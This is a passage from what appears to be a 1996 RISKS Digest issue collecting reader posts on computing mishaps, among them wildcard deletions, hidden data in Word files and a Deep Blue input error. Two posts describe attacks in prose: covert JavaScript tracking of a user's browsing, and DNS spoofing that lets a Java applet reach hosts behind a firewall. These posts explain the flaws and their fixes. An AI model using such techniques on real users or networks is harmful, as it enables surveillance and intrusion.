include Word, Excel and PowerPoint, and may also include other non-Microsoft
programs that use the OLE functions for file storage).
<P>
The notes with the service pack mention that this is not a problem under
Windows NT, since the operating system automatically clears disk space that
was used by deleted files.  The notes also go on to recommend that if you
are using non-95 versions of these programs, you should obtain the "C"
releases of these products (although the note doesn't mention where to find
patches).
<P>
I wonder if there might be a risk in posting to risks before checking with
the companies involved for fixes?  As a software author myself, I frequently
find myself rushing to put out fires created by someone reporting a security
bug in my program that was found, and immediately fixed, over a year ago.
The reporting of risks in computing is important (otherwise I wouldn't be
reading this group!), and yet I wonder if we shouldn't try more to give a
"right to reply" to some of the parties mentioned.
<P>
On an amusing side-note, it is interesting to see how many of the
respondents in <A HREF="/Risks/17.75.html">RISKS-17.75</A> to the "Wildcards" article suggest that the
wildcard problems would be fixed if only there was a DOS standard library
for expanding wildcards.  One even expressed surprise that this wasn't the
situation under DOS.  For those of you who weren't reading 17.75, there
_are_ standard wildcard expansion functions, accessed through DOS (not BIOS,
as I mistakenly wrote) interrupt 21H, subfunctions 4EH (find first file) and
4FH (find next file).  The risk?  Again, making a value-judgement on limited
information; also known as ASS-U-ME.

It occurs to me to ask if there is any possible protection against the
combination of one's own VR trained reflexes and a common shell feature:
filename completion.
<P>
I have an area of my filesystem neatly divided into three directories,
"in", "pending" and "out". When I have dealt with an "in" file, it goes
into "pending". I type "mv foo ../p&lt;tab&gt;" and let filename completion do
the rest, banging on the return key for emphasis.
<P>
This works fine until I miss one dot with a single file named (say)
"in/peter" hanging around. Then the expansion is to "mv foo ./peter" and
my trained reflex hits the return key too fast to save peter (joke).
<P>
Should I sue the shell designers for failing to protect me against my
own normal human learned reflex pattern? Or is it my fault for not
taking the precaution of letting a tyro drive my shell for me after too
much typing, like the airline pilot who gets his wife to drive him
home in case his reflexes do the right thing in the wrong situation?
<P>
As a sometime software engineer, this makes me realize that human beings
are awkward processes to program for. Driving a computer by translating
my intentions to its command structure is a risky business.

It looks as if Access 2.0 is applying regular-expression matching rules
instead of wildcard-matching rules.  In a regular expression, the '?'
indicates a match of zero or one occurrences of the preceding expression, in
this case '9'.
<P>
Note also that in a regular expression, the '.' is also a special
character, matching anything but newline. So if Access 2.0 is indeed
using regular-expression rules, then the kill command you tested
should also delete, for example, the file TEST9-TXT.

For what it's worth, a way of reducing the risk of deleting more or less
than necessary when you need to hit only a subset of files in a directory:
<UL>
<LI>create a sub-directory called TEMP (you'll know if it already exists)
<LI>MOVE the relevant file to the sub-directory (this should only involve
directory updates so it usually very quick)
<LI>examine at your leisure<BR>
<LI>delete everything in the sub-directory<BR>
<LI>get rid of the sub-directory

If I may step back a bit from the Unix/DOS arcana, perhaps the real risk is
the notion that existing files are selected by typing their names. On the
Macintosh, existing files are selected by clicking on their names or icons
in a dialog or window. (It is possible to select files by typing the name,
or part of the name, into the Find File application window, but this is not
the primary method.)
<P>
Also, on the Macintosh, file deletion is a two-step process: dragging a
file's icon to the trash makes it unavailable, but the actual bits are not
recycled until the trash is explicitly emptied.
<P>
Unix, and DOS offer considerable power to their users, and require an
equivalent amount of understanding of the inner workings of the operating
system. This may be unreasonable in an era of pervasive personal computing.

I won't get into the debate about whether UNIX shell wildcard expansion is a
good idea. Instead, I'll point out another risk. In at least one book for
new UNIX users, I have seen wildcards introduced as though the program in
the example was expanding them, rather than the shell. The book in question
claimed "all UNIX commands take wildcards."

It was said that wildcards are implemented differently under different
operating systems, DOS, Win95, Unix, VMS, etc.
<P>
And the risk of deleting files you don't want to delete is also present
in Unix.
<P>
Otto Stolz points out that 'rm x*' will remove files beginning with 'x' but
not directories or files under directories beginning with 'x'.  But, in the
FTP file transfer program, when connected to a Unix ftp server, the command
'mdel x*' will delete all files beginning with 'x' and ALL files in
directories beginning with 'x'.  The directories themselves are not removed
though.
<P>
I am not sure how the FTP server removes files; those with access to
the ftpd source might want to comment.

<P>
&gt; wildcard inconsistency: as a program does only see the expanded<BR>
&gt; parameter list, it does not know whether a wildcard string was<BR>
&gt; involved (and if so, which one).
<P>
How can this be considered "inconsistent"?  Inconsistent with what?
(Inconsistent with DOS maybe??)
<P>
The Unix shells always expand wildcards to pre-existing files (some of which
are directories); in that they are perfectly consistent.  It just happens
that in a few cases, this isn't what might be considered preferable.
<P>
However in the other 95% of cases, it means one less thing for
the program to have to deal with.
<P>
&gt; Hence, depending on the options specified, the Unix ls command<BR>
&gt; (the equivalent of the DOS dir command) lists more files than<BR>
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
&gt; the rm command (the Unix equivalent for the DOS del command)<BR>
&gt; would remove on account of the same wild-card string.
<P>
This is the inconsistency, if there is any: the "ls" command by default
expands the contents of directories one level, while the dos "dir" command
does not.  "ls -dl" would be a closer equivalent to "dir".  A more
appropriate command to use to test what "rm" is going to do would be "echo".
<P>
The source of most complaints about shell-based wildcard expansion revolve
around not being able to have two wildcard parameters, one of which is used
to match existing filenames while the second is used to generate a list of
new names based on the first set.  While this is a valid point, the cases
where this would be useful are actually quite few, can be accommodated in
other ways - just differently from how DOS would do it.
<P>
The risk?  Assuming that wildcard MATCHING of filenames is what you actually
want (rather than wildcard GENERATION of filenames), and traditionally
having a notation that does not distinguish between them.

<P>
&gt; In VM/CMS, the program gets the wildcard string, and it can use a central<BR>
&gt; routine (LISTFILE) to expand this string. I think, this is the best solution.
<P>
This is not an inconsistency in in Unix, rather a misunderstanding in the
way you use the `ls' command. If you pass a directory name to the `ls'
command, it will list the contents of that directory. You can prevent this
with the `-d' option, in which case it *will* only display the directory
name. Passing this same list to the `rm' command will not delete the
directory, which is the default behaviour for `rm'. Passing the `-r' option
to `rm', will however delete all the files in specified subdirectories. So,
under your example, you *can* delete all the files shown in the `ls' just by
passing the `-r' option to `rm'.

This difference between filename globbing predates MicroSoft Windows. In
older versions of DOS, the command 'dir *' assumes a '.*' extension,
while 'del *' assumes no extension. I always assumed each program had
it's own (and different) globbing routine, and never used a 'dir'
command to verify what the 'del' command would delete. I always just
made sure I had a couple of backups before I cleaned my drive. :)
<P>
More recently, I use Linux to maintain my DOS filesystems. ;)

<P>
In the latest battle between man and machine, the ACM Chess Challenge
between Garry Kasparov and Deep Blue, which took place in Philadelphia,
10-17 Feb 1996, the machine apparently ran into some unexpected problems.
Many of these were due to improper handling of the input and output, rather
than to the software itself. In the 22nd move of game four, the following
happened. The description is taken from the transcript, which can be found
on www.chess.ibm.park.org/deep/blue/commgm6.html; since this is a
stenographic record, there may be some technical inaccuracies, but the
essentials are correct.
<P>
&quot;DR. FENG: I went back and Garry is thinking I should wait there until I
finish the moves. The monitor that we are using is an energy saving monitor
so it went blank. So I went back and I am typing the move, A3 and somehow
the A did not get recognised, it recognised it as 3. And it was a command to
process number 3 and then I type F3 and the machine say I see a repetition
and then say there is a beep. And it stopped beating [beeping?] after that.
And then I check with the guy in the back room. They are saying that could
cause the program harm and I checked with Valvo and we restart the program.<BR>
Mr. Seirawan: So they had to restart the program and get it back up to
speed. How much time did that cost the computer on its clock?
DR. FENG: About ten minutes. And those are lost.<BR>
Mr. Seirawan: Just to be clear, stay with us please, ten minutes to reboot
everything and then ten minutes of lost thought time, so DEEP BLUE got hit
with a 20 minute --<BR>
DR. FENG: It would have played the same any way.<BR>
Mr. Seirawan: It got hit with a 20 minute penalty, it seems to me.&quot;
<P>
&gt;From the risk perspective, the situation is that we have a highly developed<BR>
and very sophisticated parallel computer which is supposed to represent the
state of the art, at least in chess computing. But apparently all the
efforts have been lavished on the chess playing part and none on the
interface or input checking. Checking the syntactical correctness of the
input should be elementary, even - or particularly - in complex software
systems. Woe to the student who forgets that! But what would have happened
if the computer had not been playing chess, but been applied to share
trading, controlling a train signalling system, a satellite, a nuclear power
plant or something else where the consequences had been more severe for a
third party?

A continental student has just asked for help with a programming

Friends running Chameleon under Windoze recently started being unable to use
mail. Every attempt to resulted in an immediate GPF. But ftp, telnet,
Netscape, etc., all worked.
<P>
Frantic re-installs of any &amp; everything had NO effect at all.  Chameleon
Tech support was totally baffled.
<P>
Further, reading mail with OTHER programs ALSO resulted in crashes. This
included replacing Chameleon with Eudora, Netscrape, etc.
<P>
Yet each bombed in its own module.

Four weeks into this, he spotted the non-obvious cause....
<P>
The system date had jumped to 2069 &amp; it was the date-sorting that was
crashing....

<P>
While riding home this past Wednesday (on my accident free commuter-rail
line), I came up with an approach to utilize the JavaScript "feature" of
Netscape 2.0 to track a user's browsing actions.  The tracking happens in
real time with the user's browser dutifully sending results back to a remote
server, starting from the time the user visits a page with the devious
JavaScript embedded in it.  It can thus sniff any passwords or keys the user
might use in a URL.
<P>
My example version runs in a browser window that the user can see.  I'm only
demonstrating the vulnerability.  Practically, the window can be made so
small as to be invisible to the casual user.  It also helps that a user
isn't even informed when the HTML page they just loaded has some JavaScript
code within it.
<P>
Think about Netscape's new JavaScript-laden home page.  The default action
on startup of Netscape 2.0 is to go to that page.  It could easily start off
tracking your browsing actions.  With the new on-line frontier being driven
by advertising, the value of such a log is immense.  Of course, if Netscape
really wanted to do something like this, they could embed all sorts of
things directly in their browser.  Naturally they don't, but this is
something that people often clamor about (e.g., the recent Microsoft Word
and the never ending AOL controversies).
<P>
As it stands, with Netscape 2.0 you cannot disable JavaScript.  You can
disable Java.  This is an interesting choice on their part, since at least
there has been a significant effort on the part of many people to justify
Java's claim of security and safeness.  Thousands of people have pored over
the code and specifications.
<P>
But, JavaScript and Java are totally different things.  They share common
names and syntax, but they don't share implementations.  One is a byte
compiled language executing in a restrictive state machine, the other is an
interpreted scripting languages with vastly different properties.  Compared
with the thousands of people have looked at the source to Java, no one has
seen JavaScript.  Its specifications are defined by the implementation,
which to date is solely Netscape 2.0.  We're told it is "Secure. Cannot
write to hard disk", which is how Java is also described.  Is there enough
commonality for such a comparison?  It is hard to determine that a program
is safe or secure after studying it.  It is impossible without.
<P>
My particular history tracker is the third (or fourth?) way to steal private
data from a user via JavaScript.  It stands out as the first one that does
it in real time, reporting history as the user is browsing.  In an
interesting bit of irony, as I was writing the code to exploit this hole, a
news article from someone at Netscape appeared noting how they has fixed 2.0
during the "beta-test" period to avoid the latest of the history stealing
approaches.
<P>
As it stands, JavaScript adds a viral element to HTML.  I'm not sure why
Netscape doesn't ship JavaScript disabled by default or why they don't alarm
the user before it starts to execute, or opens up new windows.
<P>
Finally, it is interesting to note that the Netscape Navigator already has
the building blocks to block the execution of any JavaScript (or Java) code
that doesn't come digitally signed from some trusted source.  This would
help provide a real safeguard against the types of attack downloaded code
opens up.

This message is a response to the DNS spoofing attack described in Drew
Dean's IEEE Security and Privacy paper, referred to by Drew Dean in his
<A HREF="/Risks/17.77.html">RISKS-17.77</A> posting as being in <A HREF="http://www.cs.princeton.edu/~ddean/java/">http://www.cs.princeton.edu/~ddean/java/</A> .
<P>
Background
<P>
A bit of background on DNS: (apologies for the oversimplification)
<P>
DNS is the internet "Domain Name Service".  It provides the mapping between
computer names and computer addresses.  For example, the name
ds.internic.net has the 3 IP addresses, 198.49.45.10, 192.20.239.132, and
204.179.186.65.  Probably, each IP address eventually is mapped onto a<BR>
different computer, although multiple IP addresses could also map onto a
single computer.  The reason for many-to-many name-to-address mappings is
that it enables system administrators to balance the network load on their
machines.  The name ds.internic.net is probably accessed hundreds of
thousands of times every day by people all over the network, so it makes
sense for that one name to be served by multiple machines with multiple IP
addresses.
<P>
Let's use the term "DNS spoofing" to mean that a computer on the
internet has been able to advertise a false IP address for itself.
DNS spoofing isn't directly related to Java, but might be used as part
of a Java attack applet.
<P>
Attack
<P>
The attack scenario is like so.
<OL>
<LI>The machine evil.hacker.com advertises two IP addresses for
itself, the real IP address for that machine (say 1.1.1.1) and a fake
IP address for that machine (say 6.6.6.6).  The fake IP address is
actually the address of target.com, which is the computer the attack
applet wants to try to connect to, later on.
<P>
<LI>Someone using a Java-powered browser loads an applet from
evil.hacker.com.  Now, applets are allowed to make network connections
only to the machine they came from, which in this case is
evil.hacker.com.  However, this attack applet tries to open a
connection to the computer named "target.com".
<P>
<LI>The applet security manager does a DNS lookup on the name
target.com, and checks if its IP address is in the pool of IP
addresses that this applet is allowed to connect to.  It gets the
address 6.6.6.6.  It turns out that this is one of the two addresses
associated with evil.hacker.com, and so the connection is allowed.
The connection should not be allowed.
</OL>
Why is this attack possible?
<P>
There are two reasons why this DNS Spoofing attack works:
<OL>
<LI>It's relatively easy for someone to advertise false IP
addresses.   That is, it's relatively easy for someone
to run their own domain name resolver.
<P>
<LI>The applet security manager allows an applet to connect
to any of the IP addresses associated with the name
of the computer that it came from.
</OL>
What's the fix?
<P>
The right solution for this problem is to make the Domain Name Service
more secure.  It shouldn't be so easy for anyone to advertise false
names or false addresses.
<P>
A fix for the applet security manager is to be more strict about deciding
which computers an applet is allowed to connect to.  The Java system needs
to take note of the actual IP address that the applet truly came from
(getting that numerical address from the applet's packets, as the applet is
being loaded), and thereafter only allow the applet to connect to that exact
same numerical address.  Additionally, the Java system could be even
stricter than that, by declaring that an applet can only connect to the same
port number that it came from, in addition to only being allowed to connect
to the same IP address that it came from.
<P>
What's the bottom line for me today?
<P>
An applet on its own cannot carry out this attack.  It would have to be
working in conjunction with a hacked DNS server owned and ascribed to some
domain.
<P>
Also, the attack applet would have to know the name and IP address of
machines inside a corporate firewall, in order to try to establish a
connection to machines behind the firewall.
<P>
Sun will be distributing a patch to the applet security manager to implement
the more rigorous checking described above.  That fix will be available
within a few days, and it will be distributed in source code and in bytecode
format.

<P>
Recently (<A HREF="/Risks/17.70.html">RISKS-17.70</A>, item 1) I contributed a short article on the risks
associated with an automated train-control system.  A few weeks prior to
that I had contributed a joke about French nuclear testing to
rec.humor.funny.  I'm also subscribed to the SCRNWRIT mailing list, and
regularly make contributions.
<P>
Brian Lynch reminded us (in <A HREF="/Risks/17.78.html">RISKS-17.78</A>, item 3) of some of the Risks of
not thinking before submitting, but I have been rather nastily reminded
of another.  After both news postings, I received several rather nasty
e-mail messages questioning my intelligence, heritage, and character.
<P>
One response to the RISKS article suggested I was an idiot for not
recognizing that only a moron would leave a speeding train under automatic
control.  (Which ignores several decades of psychological research on the
willingness of people to submit to authority figures, such as the supervisor
who refused permission to switch to manual.)
<P>
The responses to the joke were even nastier.  One writer suggested that
people like me were "threatening the safety of the Free World" with such
comments.  (He probably could not know that I approve of the testing regime
as important to the French weapons safety program.)
<P>
While this hasn't risen to the level of threatening phone calls
reported in <A HREF="/Risks/17.75.html">RISKS-17.75</A>, item 5, my office phone number was (until
recently) included in my .sig files, so it is certainly possible that
things could get that out of hand.
<P>
I have made contributions in print media (for example, Letters to the
Editors of both Newsweek and Playboy) but those have included only general
information, such as a name and city.  A determined attacker could still
find me, but the ease of replying to electronic postings seems to encourage
immediate attacks.  Playboy now prints the e-mail addresses of people who
send electronic Letters to the Editor.  If I send Playboy anything in the
future, I will be sure to send it on paper.
<P>
I supposed I could stop contributing electronically, or ask that any
contributions be anonymous.  However, among the few flames were some
thoughtful comments (and one kind correction) that I am loathe to forgo.
<P>
The main Risks seem to be the ease and immediacy of electronic attacks, and
the ability (using DejaNews, etc) of the disgruntled to gather additional
details about a person with whom they disagree.  This is not really news to
veterans of Usenet newsgroups, but people contributing to any electronic
forum need to be much more prepared for "flamage" than someone writing to a
newspaper.

At least at JPL, there's an enormous difference between the security

<P>
I won't go into any details, to avoid giving anyone hints, but when a new
procedure was put into place for access to the secure machines, my first
attempt to log into the secure machines failed due to a misundertannding
about the procedure.  I got a phone call from the SAs within 6 hours,

<P>
The problem of files containing other information than that shown in the
application which generated them certainly predates Word; I have seen such
information by looking (with Xtree or similar) at various files. In
particular, newsgroup postings often contain them, presumably due to people
`including' files generated by their favourite WP without realizing that
this would happen.
<P>
Surely the problem is the original application saving more of memory than it
needs, or (if the case is that garbage is picked up from the disc)
incorrectly writing the file size to the directory when it does a disc write,
so that subsequent reads read more than necessary? The extra information is
certainly not needed to reconstitute the file.

<P>
If I may step back a bit from the wildcards arcana, perhaps the real risk
is the notion that files are anything other than their entire contents.
<P>
With MacOS, DOS/Windows and UNIX we (the humans) use filenames to identify
files, while they (the computers) use serial numbers and the file contents
to perform the same task. We choose to give our files names to indicate
to us what the files contain. Some of us choose to give our files special
names to indicate to the computer what the file contains.
<P>
Now we've had two risks associated with this behaviour mentioned close
together. One day it's Microsoft's Word for Windows and its virus, the next
it's - oh, look - Microsoft's Windows 95 and its wildcard inconsistencies.
(Interesting to note that the only complaint about UNIX's wildcarding was
from someone who though ls was equivalent to dir - is this just because
UNIX users are better-educated, or because UNIX is more consistent? Either
way, the untrained users are the ones left with the poor tools.)
<P>
But I want to consider the claim that the problem with OSes that offer a
command-line is that they "require an equivalent amount of understanding of
the inner workings of the operating system," which "may be unreasonable in
an era of pervasive personal computing."
<P>
What alternative can we go out and buy?
<P>
Does using icons in preference to text help? The visual wildcarding is
performed in one (terribly inconsistent) place - my brain. And I see files
that look similar, and get the wrong one. Because if they *look* the same,
then they obviously *are* the same.
<P>
Does clicking rather than typing help? I can click quicker than I can type.
And I can usually select all or "lasso" a group. So I don't use wildcards as
much, and only resort to a shell when I want rid of all the files ending in
.o (lasso-ing files with similar endings is harder than those with similar<BR>
beginnings). So I'm less likely to abbreviate and make mistakes. But I make
still make mistakes. They're just different mistakes. Off-by-one errors
and accidental inclusions/exclusions of previous selections are hard to
imagine at the shell prompt.
<P>
Names are inadequate for describing a file's type, and they're even worse
when it comes to describing a file's contents. It makes no difference
whether I type a filename or click it, say it or write it (Apple do have
one great product). It's the *naming* itself that's the real problem.
<P>
Until we can ask our computers to "get rid of all the files that I'm never
going to want ever again", there'll be trouble.
<P>
But I'm not worried. I alias rm to rm -f, disable my dumpster and trust in
backups. And even with such recklessness I've only ever had to ask for two
files to be recovered.
<P>
If you don't have a good system, make sure you get good users.

Martin Minow described the virtue of Macintosh's two-stage delete process --
dragging a file's icon to the trash bin and then emptying the bin.  However,
what if I want to delete more than one file and do not want to do the drag
and drop many times over (in other words, what is the equivalent to the use
of wildcards)?
<P>
A common solution is to select many files at one time (by holding down the
Shift key and clicking on icons) and then moving them all in one go.  Risks?
Once I was trying to move a fair number of files (to another directory, not
to the trash bin).  After I had selected a few icons, I accidentally hit the
space bar.  In a flash all those selected files disappeared, straight to the
void and not to a middle-stage trash bin.  It is amusing that the largest
key on a keyboard is assigned this short-cut functionality.

<P>
I found an interesting variant on this theme.  Using the IBM Windows package
for FTP, I wanted to access a mainframe I never use and get a file which was
supposed to have been put in my directory.  The FTP package is nicely
designed, with windows showing local and remote, and you select files either
by typing a name or clicking, then hit on an arrow to transfer them.  I was
not sure what to expect nor what the file name might be, so I typed in "*"
in the remote window and clicked on the arrow (I may also have given a
confirming response). The PC disc seemed very busy and odd messages were
flashing across the window: when I aborted, nearly every file in the current
directory on the PC had been deleted.
<P>
I guess the (cautious) IBM approach to transfer is this: Does the file
already exist on the TO machine and directory? If so, remove it: if this
works, transfer from the FROM machine.  So, to transfer "*" you first delete
"*" ... and to crown it all, in my case the file had NOT yet been copied for
me to FTP.  Result: copying all files to my machine added none and removed
all.  (It is possible that newer versions may be better behaved).

As far as the method of handling wildcards goes msdos is
consistent while unix isn't:
<P>
msdos:	wildcards handled by application.<BR>
unix:	wildcards sometimes handled by shell ("ls -l *") and
sometimes by application ("find -name '*~' -print").
(And weird examples could mix those.)
<P>
Due to better and more available libraries Unix usually comes out ahead, but
still we have inconsistencies with respect to (say) file names starting with
a dot.

<P>
Concerning the discussion about inconsistent expansion of wildcards I can't
help submitting one of my favorite mistakes in assuming program behavior.
<P>
I was using "mail -f toobig" on a unix system in order to distribute emails
from folder "toobig" to different folders, one of them named "important".
Now, if you save *incoming mail* to a folder it gets deleted automatically
(mv'ed), if you do that from a different folder it stays there (cp'ed). I'm
sure there are reasons for that.
<P>
Now at a certain point I considered myself very smart and typed
"s important;d" assuming that was one command for saving and one
for deleting to be executed one after the other. The message
"Saved to 'important;d' [New file]" quickly informed me about my
mistake, I repeated the action using two commands as usual, made
a mental note to delete the junk file and kept going.
<P>
Then the work was done, I left the "mail" program, decided to clean up and
go home. Thus, I issued "rm important;d". Although it was not funny I had to
laugh when I was told "d: command not found".
<P>
Worst of all, I don't believe that this sort of risk can be resolved unless
one wants to use a formal language for issuing commands, which I don't. And
do not tell me that clicking subsubwindows makes the situation any better.

Clerical glitch kept dozens in jail too long:<BR>
Up to 100 people stayed in Phila. jails after judges had freed them.<BR>
By Suzanne Sataline<BR>
[PGN-Abstracted From the Philadelphia Inquirer: City &amp; Region, 25 Feb 1996]
<P>
As many as 100 citizens were locked in Philadelphia's overcrowded jails for
weeks and months after judges had ordered them freed.  Sentences, paroles,
work releases, and drug rehabilitation orders remained unrecorded for
several weeks, mostly from a single courtroom (Rocket Docket) specializing
in disposing of something like 150 cases each day.  Apparently, the
paperwork was generally OK.  However, after a lot of finger pointing, it
seems that the paper orders were not being entered fast enough into the new
computerized system, and that that system was the driving force for putting
orders into effect.

I went to NYNEX's page looking for ISDN information, and attempted to open
the appropriate link. For whatever reason, NYNEX's ISDN page is named
"iixxxpg1.html." SurfWatch, deftly noting the "xxx," decided I was trying to
access something naughty and blocked the page.
<P>
This might not be so problematic for just one page, but a large number of
NYNEX's pages have the forbidden xxx in them. Not just potential ISDN
buyers, but those requesting information on phone cards, home products,
NYNEX grants, towns which NYNEX serves, business and home-office services...
Anyone running SurfWatch will be blocked from all of this information.
Granted, there are far more pages with xxx in their names that contain
questionable material, rather than NYNEX info. But it is an issue that
people--especially large companies who want as wide an audience as
possible--now have to keep in mind.

IEEE Software seeks articles for this special issue, scheduled for
publication in May, 1997.  Software development is an inherently risky
business, but risk is not spread evenly over all software projects.  The
most risk-prone projects are likely to be the very ones to offer the most
attractive opportunities.  The tradeoff between risk and opportunity must
necessarily involve a disciplined approach to the capture, assessment and
tracking of risks.  This special issue will focus on the practice of
software risk management.
<P>
We seek original articles on:
o       case histories of risk management in action
o       risk assessment and tracking tools
o       legal and social issues pertaining to risk
o       software risk management in practice
<P>
Authors should present their work in terms that are useful to the software
community at large, emphasizing lessons learned.  Please submit one
electronic copy in RTF interchange format or eight printed copies by
August 1, 1996 to either of the special issue editors:

<P>
(Concerning Cali: a limited analysis only is possible from the Press
Release. The FMS may be peripherally involved, since I understand the pilots
were using it to obtain navigational information just before impact, and the
turn which led to impact was initiated by an autopilot selection. This by
itself wouldn't justify RISKy comment. However, there has been discussion in
the non-specialist press and on some newsgroups about other aspects of the
accident so I thought it as well to include some available reliable info.)

On Sunday, 25 Feb 1996, the Bar-Ilan University Library Alpha VAX was
working with only one third of the cpu.  An attempt to reboot stopped the
computer completely.  The Digital technician changed the memory board and
found a real dead bug in the old board.  It seems that even the best of
computers are not bug proof.

<P>
In an offline correspondence, Li Gong noted that the circumstances when
files were accidentally deleted after pressing the space bar were somewhat
unclear, including a system upgrade and system disk formatting, so this may
have been a one-off incident. In any case, neither Li Gong nor I were able
to reproduce the problem.  Please note that I am in no way suggesting that
this incident did not happen.
<P>
The Macintosh has an extremely robust file system (especially given its
design and usage constraints) with some automatic repair capability.  If it
appears that something may have been lost, I recommend that users run the
Apple "Disk First Aid" utility, which can repair many file system
inconsistencies. Also, there are third-party utilities, such as Symantec's
"Disk Doctor" that repair and test an additional set of problems, including
hardware errors and bizarre file creation dates, that Disk First Aid does
not address.
<P>
In all circumstances, however, the best remedy is to realize that these
problems can happen, and use a consistent backup strategy to provide
reasonable assurance against data loss, whether by operating system glitches
or one's own dumb mistakes. Indeed, in our offline correspondence, Li Gong
noted that the missing files were quickly recovered from a recent backup.

&gt;If I were going to censor anything about the WWW, it would be the use,<BR>
&gt;by those of us who should know better, of the term "publish" to<BR>
&gt;describe the act of making data available from a server.
<P>
While publishing isn't the only purpose of web pages, publishing is exactly
the purpose of my web pages. My goal was to make information available to
others and to distribute it. This is what a publisher does. I do not
interact with any viewer or reader, and have no desire to do so. If I didn't
use the Web, then I would have had put together a booklet or pamphlet.
<P>
&gt;Most people do not understand that surfing the net is much more like<BR>
&gt;placing 'phone calls than reading a magazine found lying on a chair.
<P>
No, it's more like wandering through a library or bookstore, looking at the
spines or covers, and occasionally opening a book up to decide if its the
one you're looking for.
<P>
&gt; Publishers are required to register with the government, for goodness' sake.
<P>
This is not true in the United States. Except for business licenses for tax
purposes, or for special mailing rates, the registering of publishers would
(and should) get immediate response, not just from publishers organizations
but from the ACLU. I can (and do) publish a newsletter without getting
anyone's permission.
<P>
&gt;Magazines may be mailed to non-subscribers; but only computer geeks<BR>
&gt;know that the images on the web-browser's screen appear only when the<BR>
&gt;user calls for them.
<P>
This is akin to saying that the pages of a book are blank until I turn to
them. The information that is used to create a particular web page exists on
its server independent of the number of people who happen to be viewing it
at any one time.
<P>
&gt;Links to other folks' pages are akin<BR>
&gt;to giving out a 'phone number--no one who does so should be thought<BR>
&gt;responsible for any message which may be heard by calling it.
<P>
Wrong again, they are more like giving out a card catalog number, ISSN,
ISBN, or simply a book's title. A list of links is like a bibliography.
All, including URLs, describe how and where to find a particular
publication or source of information. And like a book, magazine or
newsletter, no one sees my web pages unless they make an effort and
decision to see them, by clicking on the link or typing it in.
<P>
There seems to be an attempt here to split semantic hairs, confusing the
fact that while information may exist on the server, it can only be read
through a client. The only novel item introduced by the Web in the
publisher/reader relationship is that the information presented is sent on
demand (and perhaps individually tailored) to the person requesting the
information.

I have been working on a large document for the British Standards
Institution. They use Word 6, and provided me with a diskette containing the
latest master so that I could make my amendments electronically.
<P>
One thing that had surprised me about the printed draft was that the words
"reliability's" and "non-conformance's" occurred all over the place, whereas
I had originally written "reliabilities" (as in: "The same software may show
different reliabilities on different installations.") and "non-conformances"
(as in: "The purpose of Fagan inspection is to detect non-conformances
between code and design before these become faults in the delivered
software.").
<P>
When I ran the Word 6 spelling checker, the reason became obvious.  The
dictionary did not allow for a plural of either of these words.  The typist
who had originally input my text had taken its suggestions at face value and
done a global change.
<P>
The checker also insisted that I was either "Mellow" or a "Melon", and that
M.E. Fagan of inspections fame was either a "Pagan" or a "Fagot"! :-)

This problem has been independently verified by other WFW 3.11 users.
We have a mail file on the subject, including a message from
Rick Mayell[101323,2073] , Project Engineer, South Western Electricity.
<P>
It appears to be verified by Microsoft (obliquely) in Document Q110092.
<P>
Subject: Data loss: VCACHE with BDE, problem??<BR>
Windows For Workgroups Caching Problem
<P>
This problem was discovered using Borland Delphi, however the engine
is the same, and the same problem may be apparent on Paradox...
<P>
We have discovered a problem where the WFWG 3.11  VCACHE caching
mechanism appears to stop committing data to the local hard-drive
and is lost following a hard reset or power-off. Disabling 32-bit
access and using Smartdrv appears to correct the problem (see note 5).
<P>
Known factors:
<OL>
<LI>We have so far only observed the problem when the system is running
our application which is written in Delphi 1.0 and uses the Borland
Database Engine (BDE) ver 2.51a. Note: The BDE cache is NOT the
cause of the data loss (see point 3). We have not been able to
determine whether it also occurs without our application running.
If our app or the BDE causes VCACHE to fail - we have not been
able to determine how this occurs since it seems to happen
somewhat randomly (?)
<P>
<LI>A significant amount of data can be lost - even several hours worth
- so this is not the effect of write-behind cached data that has
not yet had the opportunity to commit at the time of reset. Our app
can sit idle for an hour and still lose cached data.
<P>
<LI>The Borland Database Engine caching mechanism is NOT responsible
for the data loss.<BR>
Evidence:<BR>
-after each data post, each table in our app is closed and/or
flushed from the BDE cache using the dbiSaveChanges engine
call<BR>
-data is also lost from text output files written to with the
Pascal writeln command<BR>
-data is lost from all other running apps (see Notepad example
below)
<P>
<LI>When VCACHE fails... all running apps fail to commit data to the
local drive. We tested Notepad running concurrently with our app -
periodically editing and saving a file from Notepad as we worked
on our app. After reset data added after a given point in time is
not included in the file. The time of failure to save data is the
same time as for our app and all other running apps. The Progress
Runtime client also acted this way in a similar test.
<P>
<LI>When 32-bit file access is disabled, and only Smartdrv is used to
cache data - this problem DOES NOT exist - even when write-behind
caching is enabled (of course, in this case,  the last 5-seconds
worth of editing will be lost). This suggests that even if our
app or the BDE causes the failure, then VCACHE is somehow
vulnerable in a way that Smartdrv is not. The problem does not
exist in Windows 3.10 or 3.11 (non-Workgroups) - since these do
not use VCACHE/32-bit file access. We have not tested the
behaviour yet under Windows 95.
<P>
<LI>We have identified this problem using two fairly different
computer systems (one DEC and one Acer) - both running
WFWG 3.11 on a Novell 4.10 network (all patches installed)
with recent VLMs (version 1.20a).
<P>
<LI>Data written to network volumes is NOT lost (of course, this
data is not cached by VCACHE)
<P>
<LI>All the running apps seem to behave "as normal". not reporting
errors. Note: when the apps write data - they can re-read it
back successfully even though this data will be lost after reset,
therefore, the data does exist in the cache as valid data -
the data just has not been flushed to the disk.
<P>
<LI>The problem seemed to be connected to low USER resources (&lt;40%)
- however, we have reproduced it with fairly high (&gt;55%) levels
so we are not sure if there is really a connection.
</OL>
Does anyone recognize this problem ???
<P>
Thank you, in advance, for any help.

WordPerfect has a feature that generates a table of contents at a chosen
place (at the front by default).  I had a long report which needed this
feature, and to see whether I had marked enough text to make a sensible
contents list I generated the table with only the 'body' of the report
entered.  It worked well.  I then went to work to add the conventional pages
before the TOC - summary, title sheet, and so on.  When this was done I
started improving the body, and in due course needed a new TOC.  Result:
summary, title sheet, and so on all disappeared.
<P>
What WPF does is to mark a section of text as 'generated' using marker codes
which you don't normally see.  When you generate a TOC, it removes all the
text between these markers and inserts what it creates.  Unfortunately,
moving to 'top of text' can get you above the TOC but (just) within this
marked area.  Result: anything you have put there gets wiped out next time
you do a 'generate'.  Pretty obvious when you look into it - but infuriating
to a learner.

The current thread, about Word using disk space without initializing it,
seems not to be a Word problem, but an OLE problem and thus would apply to
all applications that use OLE2.  I have noted this problem with Word on my
own workstation.  Additionally, Microsoft has addressed this problem and a
fix is available for Win 95 users in the recently released Win 95 Service
Pack.  I believe that the OLE2 update is also available as a single file
download from ftp.microsoft.com.
<P>
